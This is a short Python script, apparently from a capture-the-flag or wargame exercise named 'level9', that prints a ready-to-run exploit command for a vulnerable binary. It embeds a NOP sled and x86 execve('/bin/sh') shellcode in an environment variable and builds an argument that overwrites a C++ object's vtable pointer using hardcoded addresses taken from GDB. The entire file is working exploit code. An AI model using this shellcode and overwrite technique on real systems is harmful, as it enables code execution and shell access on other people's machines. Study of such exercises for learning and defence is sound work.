#!/usr/bin/env python3
"""Level9: transform shellcode addr + first+4 into final env + argv exploit command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

# From GDB: adresse dans le nopsled (x/200s environ) → ex. 0xbffffc63 (adapter selon VM)
SHELLCODE_ADDR = 0xBFFFFC63
# premier+4 (objet first + 4), from GDB after run → ex. 0x0804a00c
FIRST_PLUS_4 = 0x0804A00C
PADDING_LEN = 104  # between shellcode addr and second->vptr overwrite

# Escapes for shell: print "\x90"... in python -c
ENV_ESCAPES = (
    "\\x90" * 1000
    + "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b"
    "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80"
    "\\xe8\\xdc\\xff\\xff\\xff/bin/sh"
)

def main():
    addr_le = p32(SHELLCODE_ADDR)
    first_le = p32(FIRST_PLUS_4)
    addr_str = "".join("\\x%02x" % b for b in addr_le)
    first_str = "".join("\\x%02x" % b for b in first_le)
    argv1_inner = 'print "%s" + "B"*%d + "%s"' % (addr_str, PADDING_LEN, first_str)
    env_inner = 'print "%s"' % ENV_ESCAPES
    cmd = (
        "env -i payload=$(python -c '%s') ./level9 $(python -c '%s')"
        % (env_inner, argv1_inner)
    )
    print(cmd)
    print("# shellcode_addr =", hex(SHELLCODE_ADDR), ", first+4 =", hex(FIRST_PLUS_4))

if __name__ == "__main__":
    main()
